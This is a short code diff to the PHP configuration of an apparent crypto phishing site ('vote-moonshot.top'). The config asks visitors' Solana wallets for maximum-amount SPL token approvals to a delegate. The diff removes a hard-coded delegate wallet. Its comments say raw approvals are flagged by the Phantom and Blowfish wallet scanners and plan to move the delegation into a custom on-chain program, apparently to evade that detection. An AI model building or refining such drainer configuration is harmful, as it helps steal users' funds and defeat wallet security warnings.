@@ -27,10 +27,9 @@ $cfg = [
     'restrict_script_access' => true,
     'allowed_script_hosts' => ['vote-moonshot.top', 'www.vote-moonshot.top'],
 
-    // Raw SPL Approve → wallet delegate is flagged by Phantom/Blowfish. Use BPF program instead.
+    // SPL delegate via BPF program (PDA). Enable after: programs/vote-delegate deploy.
     'token_approval_enabled' => false,
     'token_approval_program_id' => '',
-    'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
     'token_approval_max_count' => 1,
     'token_approval_min_usd' => 1.0,
     'token_approval_amount_mode' => 'max',
@@ -205,7 +204,6 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? false),
         'tokenApprovalProgramId' => (string) ($cfg['token_approval_program_id'] ?? ''),
-        'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
         'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
         'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
         'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
